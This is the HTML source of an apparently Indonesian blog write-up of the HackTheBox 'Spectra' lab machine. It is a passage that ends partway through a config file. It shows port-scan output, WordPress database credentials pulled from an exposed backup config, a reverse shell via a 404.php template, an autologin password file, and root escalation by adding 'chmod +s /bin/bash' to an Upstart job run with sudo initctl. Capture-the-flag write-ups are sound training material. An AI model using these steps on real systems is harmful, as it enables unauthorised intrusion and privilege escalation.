@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox: Spectra | sharpicx</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="HackTheBox: Spectra" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Entah kenapa yang saya posting disini berkategori miss-configuration terus, bosen atuh. Tapi ya bodoamatin aja lah ya hehe. Dan btw, mesin kali ini dari HackTheBox iseng iseng aja mulai dari yang easy dulu. Tapi ini gk kalah menarik, menarik dalam artian bagi saya sendiri sih di HTB bisa nyelesain 2 jam hehe. rekor terbaru." />
+<meta property="og:description" content="Entah kenapa yang saya posting disini berkategori miss-configuration terus, bosen atuh. Tapi ya bodoamatin aja lah ya hehe. Dan btw, mesin kali ini dari HackTheBox iseng iseng aja mulai dari yang easy dulu. Tapi ini gk kalah menarik, menarik dalam artian bagi saya sendiri sih di HTB bisa nyelesain 2 jam hehe. rekor terbaru." />
+<link rel="canonical" href="http://localhost:4000/2021/06/16/htb-spectra" />
+<meta property="og:url" content="http://localhost:4000/2021/06/16/htb-spectra" />
+<meta property="og:site_name" content="sharpicx" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-16T22:33:36+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox: Spectra" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-06-16T22:33:36+07:00","datePublished":"2021-06-16T22:33:36+07:00","description":"Entah kenapa yang saya posting disini berkategori miss-configuration terus, bosen atuh. Tapi ya bodoamatin aja lah ya hehe. Dan btw, mesin kali ini dari HackTheBox iseng iseng aja mulai dari yang easy dulu. Tapi ini gk kalah menarik, menarik dalam artian bagi saya sendiri sih di HTB bisa nyelesain 2 jam hehe. rekor terbaru.","headline":"HackTheBox: Spectra","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/06/16/htb-spectra"},"url":"http://localhost:4000/2021/06/16/htb-spectra"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<meta name="keywords" content="mis-config,ssh,wordpress,initctl,setsuid" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" href="/favicon.ico"/>
+<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
+<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
+<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
+<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+<!--[if lt IE 9]>
+  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>
+
+
+<script src="/assets/script/jekyllpaper.js" async ></script>
+<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>
+
+
+</head>
+<body>
+  <div class="container-wrapper">
+    <header class="container-header">
+      <div class="header-info">
+  <span class="header-info-name">sharpicx</span><br/>
+  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
+</div>
+<nav class="header-nav">
+  <ul class="header-main-nav">
+  
+    <li class="header-main-nav-item"><a href="/">home</a></li>
+  
+    <li class="header-main-nav-item"><a href="/category">categories</a></li>
+  
+    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
+  
+  </ul>
+</nav>
+
+    </header>
+    <main class="container-main">
+      <article class="container-post">
+  <div class="post-title" style="padding: 0px 0px 20px 0px">
+    <h1>HackTheBox: Spectra</h1>
+  </div>
+  <div class="post-author">
+    <span>sharpicx</span>
+  </div>
+  <div class="post-content">
+    <p>Entah kenapa yang saya posting disini berkategori <strong>miss-configuration</strong> terus, bosen atuh. Tapi ya bodoamatin aja lah ya hehe. Dan btw, mesin kali ini dari <a href="https://www.hackthebox.eu/home/machines/profile/317">HackTheBox</a> iseng iseng aja mulai dari yang easy dulu. Tapi ini gk kalah menarik, menarik dalam artian bagi saya sendiri sih di <em>HTB</em> bisa nyelesain 2 jam hehe. rekor terbaru.</p>
+
+<h2 id="machine-information">Machine Information</h2>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Details</strong></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Name of Machine</td>
+      <td><strong>Spectra</strong></td>
+    </tr>
+    <tr>
+      <td>Difficulty Level</td>
+      <td><strong>Easy</strong></td>
+    </tr>
+    <tr>
+      <td>Date Released</td>
+      <td><strong>27 Feb 2021</strong></td>
+    </tr>
+    <tr>
+      <td>Date Retired</td>
+      <td><strong>26 Juny 2021</strong></td>
+    </tr>
+    <tr>
+      <td>Date I Completed it</td>
+      <td><strong>16 Juny 2021</strong></td>
+    </tr>
+    <tr>
+      <td>Radar Graph</td>
+      <td><img src="https://i.postimg.cc/jdK08GJz/download.png" alt="radar" /></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ul>
+  <li><a href="#recon">Reconnaissance</a>
+    <ul>
+      <li><a href="#nmap">Ports</a></li>
+      <li><a href="#website">Website - TCP 80</a></li>
+      <li><a href="#spectra">spectra.htb</a></li>
+    </ul>
+  </li>
+  <li><a href="#nginx">Shell as nginx</a></li>
+  <li><a href="#katie">Shell as katie</a></li>
+  <li><a href="#privesc">Privilege Escalation</a></li>
+</ul>
+
+<h2 id="recon">Reconnaissance</h2>
+<h2 id="nmap">Ports</h2>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>          <span class="n">REASON</span>  <span class="n">VERSION</span>
+<span class="m">22</span><span class="p">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">ssh</span>              <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">OpenSSH</span> <span class="m">8.1</span> <span class="p">(</span><span class="n">protocol</span> <span class="m">2.0</span><span class="p">)</span>
+<span class="p">|</span> <span class="n">ssh</span><span class="p">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="p">|</span>   <span class="m">4096</span> <span class="m">52</span><span class="p">:</span><span class="m">47</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="m">5</span><span class="n">c</span><span class="p">:</span><span class="m">37</span><span class="p">:</span><span class="m">4f</span><span class="p">:</span><span class="m">29</span><span class="p">:</span><span class="m">0</span><span class="n">e</span><span class="p">:</span><span class="m">8</span><span class="n">e</span><span class="p">:</span><span class="m">1d</span><span class="p">:</span><span class="m">88</span><span class="p">:</span><span class="m">6</span><span class="n">e</span><span class="p">:</span><span class="n">f9</span><span class="p">:</span><span class="m">23</span><span class="p">:</span><span class="m">4d</span><span class="p">:</span><span class="m">5</span><span class="nf">a</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_ssh</span><span class="p">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAACAQDF1xom8Ljz30NltgYXTRoVI2ymBlBZn849bnFYNKwDgwvW9naxom8pe9mzV</span><span class="p">+</span><span class="n">I8pAb5AHeVdok7szaIke7nXINK5GdHw</span><span class="p">+</span><span class="n">P529fkRNfmq4V63RUmYNKeAZmfGubCQDwGHP0Gj8S</span><span class="p">/</span><span class="n">C1lCMp</span><span class="p">/</span><span class="m">9</span><span class="n">kdNPxDv8aamWTeVCTuqDOwMy0GmEGRyk9gaZjwA2T3kIVD</span><span class="p">/</span><span class="n">TjLVu5hkpwdoQHr0JYhJRqLKHqZqdcZY7vqUFuECqcgVZ0Sj52</span><span class="p">/</span><span class="n">VnT5lis</span><span class="p">+</span><span class="n">N3hZK1MqJW2vlPhdlXhESF2O2Z0gzVtnAMB8yT68pbcRUbl6OI0NC6ucKzSIb6g90vwF1kVlj22GXTcfu0r3tyCFlusJFnuhgAIrTax8eQu5W</span><span class="p">+</span><span class="n">vLAAM0pbMizVNOEzd4VtBpLBHunEkzDknUZn3k9X3XP9NsIReMW</span><span class="p">+</span><span class="n">T8XiLTSxZuve8EWdaIfXoAeUlj0Tsy2iwYfLk6XaO5xssZgHFvB4QnUvpdt2ybsfTEd1aySikuetak9pl7yECFD8jgqT6ybzG1qsTMsdsJz6o871al1r0Dyd76R0Dr3</span><span class="p">+</span><span class="n">dO7AhLJtPszZHJXK3YqCqF</span><span class="p">/</span><span class="n">qU6kNIPMTIXdiVEuYQ1JieYzyjN3CivzVUPFnvOu2</span><span class="p">+</span><span class="n">dD5kFQSQNqR8kHGRqZXW0oUQsDUh1GQsb</span><span class="p">+</span><span class="n">iO8sFMDIAqr1SfAKQEpCPpSFl6H1wtNHW8pJJNwj1FkKNXw</span><span class="p">==</span>
+<span class="m">80</span><span class="p">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">http</span>             <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">nginx</span> <span class="m">1.17</span><span class="p">.</span><span class="m">4</span>
+<span class="p">|</span> <span class="n">http</span><span class="p">-</span><span class="n">methods</span><span class="p">:</span> 
+<span class="p">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span>
+<span class="p">|</span><span class="n">_http</span><span class="p">-</span><span class="n">server</span><span class="p">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="p">/</span><span class="m">1.17</span><span class="p">.</span><span class="m">4</span>
+<span class="p">|</span><span class="n">_http</span><span class="p">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">have</span> <span class="n">a</span> <span class="nf">title</span> <span class="p">(</span><span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">).</span>
+<span class="m">3306</span><span class="p">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">mysql</span>            <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="nf">MySQL</span> <span class="p">(</span><span class="n">unauthorized</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_ssl</span><span class="p">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="nf">failed</span> <span class="p">(</span><span class="n">use</span> <span class="p">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_ssl</span><span class="p">-</span><span class="n">date</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="nf">failed</span> <span class="p">(</span><span class="n">use</span> <span class="p">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_sslv2</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="nf">failed</span> <span class="p">(</span><span class="n">use</span> <span class="p">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_tls</span><span class="p">-</span><span class="n">alpn</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="nf">failed</span> <span class="p">(</span><span class="n">use</span> <span class="p">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="p">|</span><span class="n">_tls</span><span class="p">-</span><span class="n">nextprotoneg</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="nf">failed</span> <span class="p">(</span><span class="n">use</span> <span class="p">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="m">8081</span><span class="p">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">blackice</span><span class="p">-</span><span class="n">icecap</span><span class="p">?</span> <span class="n">syn</span><span class="p">-</span><span class="n">ack</span>
+<span class="p">|</span> <span class="n">fingerprint</span><span class="p">-</span><span class="n">strings</span><span class="p">:</span> 
+<span class="p">|</span>   <span class="n">FourOhFourRequest</span><span class="p">:</span> 
+<span class="p">|</span>     <span class="n">HTTP</span><span class="p">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="n">OK</span>
+<span class="p">|</span>     <span class="n">Content</span><span class="p">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">plain</span>
+<span class="p">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="m">27</span> <span class="n">Jun</span> <span class="m">2021</span> <span class="m">10</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">04</span> <span class="n">GMT</span>
+<span class="p">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="p">|</span>     <span class="n">Hello</span> <span class="n">World</span>
+<span class="p">|</span>   <span class="n">GetRequest</span><span class="p">:</span> 
+<span class="p">|</span>     <span class="n">HTTP</span><span class="p">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="n">OK</span>
+<span class="p">|</span>     <span class="n">Content</span><span class="p">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">plain</span>
+<span class="p">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="m">27</span> <span class="n">Jun</span> <span class="m">2021</span> <span class="m">10</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">03</span> <span class="n">GMT</span>
+<span class="p">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="p">|</span>     <span class="n">Hello</span> <span class="n">World</span>
+<span class="p">|</span>   <span class="n">HTTPOptions</span><span class="p">:</span> 
+<span class="p">|</span>     <span class="n">HTTP</span><span class="p">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="n">OK</span>
+<span class="p">|</span>     <span class="n">Content</span><span class="p">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">plain</span>
+<span class="p">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="m">27</span> <span class="n">Jun</span> <span class="m">2021</span> <span class="m">10</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">10</span> <span class="n">GMT</span>
+<span class="p">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="p">|</span><span class="n">_</span>    <span class="n">Hello</span> <span class="n">World</span>
+<span class="p">|</span><span class="n">_mcafee</span><span class="p">-</span><span class="n">epo</span><span class="p">-</span><span class="n">agent</span><span class="p">:</span> <span class="n">ePO</span> <span class="n">Agent</span> <span class="n">not</span> <span class="n">found</span>
+<span class="m">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="p">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="p">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="c1">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="n">SF</span><span class="p">-</span><span class="n">Port8081</span><span class="p">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="p">=</span><span class="m">7.91</span><span class="p">%</span><span class="n">I</span><span class="p">=</span><span class="m">7</span><span class="p">%</span><span class="n">D</span><span class="p">=</span><span class="m">6</span><span class="p">/</span><span class="m">27</span><span class="p">%</span><span class="n">Time</span><span class="p">=</span><span class="m">60D84D</span><span class="n">CE</span><span class="p">%</span><span class="n">P</span><span class="p">=</span><span class="n">x86_64</span><span class="p">-</span><span class="n">unknown</span><span class="p">-</span><span class="n">linux</span><span class="p">-</span><span class="n">gnu</span>
+<span class="n">SF</span><span class="p">:%</span><span class="nf">r</span><span class="p">(</span><span class="n">GetRequest</span><span class="p">,</span><span class="m">71</span><span class="p">,</span><span class="s">"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain
+</span><span class="n">SF</span><span class="p">:</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nDate</span><span class="p">:</span><span class="err">\</span><span class="n">x20Sun</span><span class="p">,</span><span class="err">\</span><span class="n">x2027</span><span class="err">\</span><span class="n">x20Jun</span><span class="err">\</span><span class="n">x202021</span><span class="err">\</span><span class="n">x2010</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">03</span><span class="err">\</span><span class="n">x20GMT</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nConnection</span>
+<span class="n">SF</span><span class="p">::</span><span class="err">\</span><span class="n">x20close</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nHello</span><span class="err">\</span><span class="n">x20World</span><span class="err">\</span><span class="n">n</span><span class="s">")%r(FourOhFourRequest,71,"</span><span class="n">HTTP</span><span class="p">/</span><span class="m">1</span><span class="err">\</span><span class="p">.</span><span class="m">1</span><span class="err">\</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">x20200</span><span class="err">\</span><span class="n">x20OK</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nContent</span><span class="p">-</span><span class="n">Type</span><span class="p">:</span><span class="err">\</span><span class="n">x20text</span><span class="p">/</span><span class="n">plain</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nDate</span><span class="p">:</span><span class="err">\</span><span class="n">x20Sun</span><span class="p">,</span><span class="err">\</span><span class="n">x2027</span><span class="err">\</span><span class="n">x20J</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">un</span><span class="err">\</span><span class="n">x202021</span><span class="err">\</span><span class="n">x2010</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">04</span><span class="err">\</span><span class="n">x20GMT</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nConnection</span><span class="p">:</span><span class="err">\</span><span class="n">x20close</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nHello</span><span class="err">\</span><span class="n">x20W</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">orld</span><span class="err">\</span><span class="n">n</span><span class="s">")%r(HTTPOptions,71,"</span><span class="n">HTTP</span><span class="p">/</span><span class="m">1</span><span class="err">\</span><span class="p">.</span><span class="m">1</span><span class="err">\</span><span class="n">x20200</span><span class="err">\</span><span class="n">x20OK</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nContent</span><span class="p">-</span><span class="n">Type</span><span class="p">:</span><span class="err">\</span><span class="n">x20t</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">ext</span><span class="p">/</span><span class="n">plain</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nDate</span><span class="p">:</span><span class="err">\</span><span class="n">x20Sun</span><span class="p">,</span><span class="err">\</span><span class="n">x2027</span><span class="err">\</span><span class="n">x20Jun</span><span class="err">\</span><span class="n">x202021</span><span class="err">\</span><span class="n">x2010</span><span class="p">:</span><span class="m">07</span><span class="p">:</span><span class="m">10</span><span class="err">\</span><span class="n">x20GMT</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nC</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">onnection</span><span class="p">:</span><span class="err">\</span><span class="n">x20close</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nHello</span><span class="err">\</span><span class="n">x20World</span><span class="err">\</span><span class="n">n</span><span class="s">");
+</span></code></pre></div></div>
+
+<h2 id="website">Website - TCP 80</h2>
+<p><img src="https://i.postimg.cc/jSBLJxLH/image.png" alt="qqwswd" /></p>
+
+<p>simple, dan kedua link tsb merujuk kepada domain atau host <code class="language-plaintext highlighter-rouge">spectra.htb</code>. jadi saya tambahkan ke <code class="language-plaintext highlighter-rouge">/etc/hosts</code> dengan cara</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.10.10.229 spectra.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+<p>after that, saya mencoba untuk mebruteforce directory web tapi tidak menemukan apa-apa.</p>
+
+<h2 id="spectra">spectra.htb</h2>
+<p><strong>/main/index.php</strong>
+<img src="https://i.postimg.cc/yNz3b6sV/image.png" alt="asdfvasdzz" /></p>
+
+<p>Pada gambar tersebut sekilas normal menurut saya tidak ada yang menarik untuk di analisis lagi (anjay analisis). Tapi tulisan <strong>Hello World</strong> itu ternyata adalah sebuah postingan blog dengan nama author <strong>administrator</strong> confirmed by <strong>wpscan</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] administrator
+ | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>/testing/index.php</strong><br />
+<img src="https://i.postimg.cc/wvRKRzRm/image.png" alt="asdas" /></p>
+
+<p>Lalu saya melirik pada link kedua ini, terlihat membosankan coz of empty page. Dan menariknya ketika saya hilangkan <strong>/index.php</strong> ada sebuah tampilan semacam dirlist.</p>
+
+<p><img src="https://i.postimg.cc/tTqKD6cF/image.png" alt="dirlist" /></p>
+
+<p>rata-rata disitu hanya ada file yang berformat PHP dan file-file wordpress. dan menariknya pada gambar diatas juga terlihat <strong>wp-config.php</strong> yang dimana username dan password akan diletakkan pada file tersebut. bagaimanapun ada file lain yaitu <strong>wp-config.php.save</strong> yang dimana file ini mungkin juga saat ingin meng-edit sesuatu didalamnya ada kecelakaan crash pada <strong>nano</strong>.</p>
+
+<p>ketika saya buka.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="cd">/** The name of the database for WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'dev'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'devtest'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'devteam01'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="nginx">Shell as nginx</h2>
+<p>saya langsung buka metasploit, karena malas untuk ngedit file reverse shell berbentuk PHP dari <strong>pentestMonkey</strong> dan menguploadnya pada file <strong>404.php</strong> di wordpress spectra.</p>
+
+<p><img src="https://i.postimg.cc/QtNM5Hky/image.png" alt="herewego" /></p>
+
+<h2 id="katie">Shell as katie</h2>
+<p>saya mencoba melihat-lihat isi directory <strong>/opt</strong> iseng aja sih. eh taunya nemu ginian.
+<img src="https://i.postimg.cc/BnVWNt0z/image.png" alt="ssass" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>autologin.conf.orig
+<span class="c"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
+<span class="c"># Use of this source code is governed by a BSD-style license that can be</span>
+<span class="c"># found in the LICENSE file.</span>
+description   <span class="s2">"Automatic login at boot"</span>
+author        <span class="s2">"chromium-os-dev@chromium.org"</span>
+<span class="c"># After boot-complete starts, the login prompt is visible and is accepting</span>
+<span class="c"># input.</span>
+start on started boot-complete
+script
+  <span class="nv">passwd</span><span class="o">=</span>
+  <span class="c"># Read password from file. The file may optionally end with a newline.</span>
+  <span class="k">for </span><span class="nb">dir </span><span class="k">in</span> /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do
+    if</span> <span class="o">[</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">dir</span><span class="k">}</span><span class="s2">/passwd"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+      </span><span class="nv">passwd</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">dir</span><span class="k">}</span><span class="s2">/passwd"</span><span class="si">)</span><span class="s2">"</span>
+      <span class="nb">break
+    </span><span class="k">fi
+  done
+  if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">passwd</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exit </span>0
+  <span class="k">fi</span>
+  <span class="c"># Inject keys into the login prompt.</span>
+  <span class="c">#</span>
+  <span class="c"># For this to work, you must have already created an account on the device.</span>
+  <span class="c"># Otherwise, no login prompt appears at boot and the injected keys do the</span>
+  <span class="c"># wrong thing.</span>
+  /usr/local/sbin/inject-keys.py <span class="nt">-s</span> <span class="s2">"</span><span class="k">${</span><span class="nv">passwd</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-k</span> enter
+end script
+
+</code></pre></div></div>
+<p>tanpa banyak gaya saya list dulu ke <strong>/etc/autologin</strong> apakah benar ada file <strong>passwd</strong>.</p>
+
+<p><img src="https://i.postimg.cc/kgrKSvVY/image.png" alt="damnbitch" /></p>
+
+<p>Dan yap we got it.</p>
+
+<p><img src="https://i.postimg.cc/28W0bwj3/image.png" alt="damn" /></p>
+
+<h2 id="privesc">PrivEsc</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User katie may run the following commands on spectra:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-group</span> developers 2&gt;/dev/null
+/etc/init/test6.conf
+/etc/init/test7.conf
+/etc/init/test3.conf
+/etc/init/test4.conf
+/etc/init/test.conf
+/etc/init/test8.conf
+/etc/init/test9.conf
+/etc/init/test10.conf
+/etc/init/test2.conf
+/etc/init/test5.conf
+/etc/init/test1.conf
+/srv/nodetest.js
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl status test1
+test1 stop/waiting
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl status test2
+test2 stop/waiting
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl status test3
+test3 start/running, process 5108
+<span class="nt">-bash-4</span>.3<span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl stop test3
+test3 stop/waiting
+</code></pre></div></div>
+<blockquote>
+  <p>initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.</p>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">description</span> <span class="dl">"</span><span class="s2">Test node.js server</span><span class="dl">"</span>
+<span class="nx">author</span>      <span class="dl">"</span><span class="s2">katie</span><span class="dl">"</span>
+
+<span class="nx">start</span> <span class="nx">on</span> <span class="nx">filesystem</span> <span class="nx">or</span> <span class="nx">runlevel</span> <span class="p">[</span><span class="mi">2345</span><span class="p">]</span>
+<span class="nx">stop</span> <span class="nx">on</span> <span class="nx">shutdown</span>
+
+<span class="nx">script</span>
+   
+    <span class="nx">exec</span> <span class="nx">chmod</span> <span class="o">+</span><span class="nx">s</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+    <span class="k">export</span> <span class="nx">HOME</span><span class="o">=</span><span class="dl">"</span><span class="s2">/srv</span><span class="dl">"</span>
